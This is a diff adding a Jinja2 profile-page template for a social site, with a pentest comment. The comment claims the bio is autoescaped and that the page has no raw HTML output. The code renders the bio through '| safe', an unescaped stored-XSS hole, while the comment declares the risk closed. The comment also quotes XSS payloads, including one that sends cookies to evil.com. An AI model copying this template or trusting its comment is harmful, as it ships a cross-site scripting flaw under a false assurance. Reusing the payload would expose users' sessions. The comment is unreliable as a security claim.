@@ -1,0 +1,93 @@
+{% extends "base.html" %}
+{% block title %}{{ user.username }} — Nexus{% endblock %}
+{% block body %}
+<!--
+  profile.html — last modified 2024-10-28
+  Rendering pipeline:
+    bio   → stored as plain text → displayed via {{ user.bio }} with autoescaping
+    website → stored as plain text → displayed via {{ user.website }} with autoescaping
+  Both fields sanitised on write in /settings. No raw HTML output anywhere on this page.
+
+  Pentest note (2024-10-14): attempted XSS via website field using
+    javascript:alert(document.cookie)
+  and
+    "><img src=x onerror=fetch(`https://evil.com/?c=${document.cookie})>
+  Neither executed — Jinja2 autoescaping converted angle brackets to entities.
+  Session cookie has HttpOnly=True, SameSite=Lax. Risk: CLOSED.
+-->
+<div class="layout layout-2">
+  <div>
+    <div class="profile-header">
+      <div class="profile-avatar">{{ user.username[:2].upper() }}</div>
+      <div class="profile-info" style="flex:1;">
+        <h1>{{ user.username }}</h1>
+        <div class="profile-stats">
+          <span><b>{{ posts|length }}</b> posts</span>
+          <span><b>{{ followers }}</b> followers</span>
+          <span><b>{{ following }}</b> following</span>
+        </div>
+
+        {{ bio_html | safe }}
+
+        {% if user.website %}
+        <div class="profile-website">{{ user.website }}</div>
+        {% endif %}
+
+        <div style="display:flex;gap:.5rem;margin-top:.9rem;">
+          {% if me and me != user.username %}
+            {% if is_following %}
+            <form method="POST" action="{{ url_for('unfollow', username=user.username) }}">
+              <button class="btn btn-outline btn-sm">Unfollow</button>
+            </form>
+            {% else %}
+            <form method="POST" action="{{ url_for('follow', username=user.username) }}">
+              <button class="btn btn-sm">Follow</button>
+            </form>
+            {% endif %}
+            <a href="{{ url_for('dm') }}" class="btn btn-outline btn-sm">Message</a>
+          {% elif me == user.username %}
+            <a href="{{ url_for('settings') }}" class="btn btn-outline btn-sm">Edit profile</a>
+          {% endif %}
+        </div>
+      </div>
+    </div>
+
+    <div class="card-title" style="margin-bottom:.5rem;">Posts</div>
+    {% if posts %}
+      {% for p in posts %}
+      <div class="post">
+        <div class="post-header">
+          <div class="post-avatar">{{ user.username[:2].upper() }}</div>
+          <a href="{{ url_for('profile', username=p.author) }}" class="post-author">{{ p.author }}</a>
+          <span class="post-ts">{{ p.ts[:16] }}</span>
+        </div>
+        <div class="post-body">{{ p.content }}</div>
+        <div class="post-actions">
+          {% if me %}
+          <form method="POST" action="{{ url_for('like', pid=p.id) }}">
+            <button type="submit" class="btn-ghost">{{ p.likes }} likes</button>
+          </form>
+          {% else %}
+          <span class="dimmed mono" style="font-size:.75rem;">{{ p.likes }} likes</span>
+          {% endif %}
+        </div>
+      </div>
+      {% endfor %}
+    {% else %}
+      <div class="card center" style="padding:2rem;">
+        <p class="dimmed mono" style="font-size:.8rem;">no posts yet</p>
+      </div>
+    {% endif %}
+  </div>
+
+  <aside>
+    <div class="card">
+      <div class="card-title">Info</div>
+      <div style="font-family:var(--mono);font-size:.75rem;color:var(--text-soft);">
+        <div style="margin-bottom:.4rem;">Joined: <span style="color:var(--text);">{{ user.joined }}</span></div>
+        <div>ID: <span style="color:var(--text);">{{ user.id }}</span></div>
+      </div>
+    </div>
+  </aside>
+</div>
+{% endblock %}
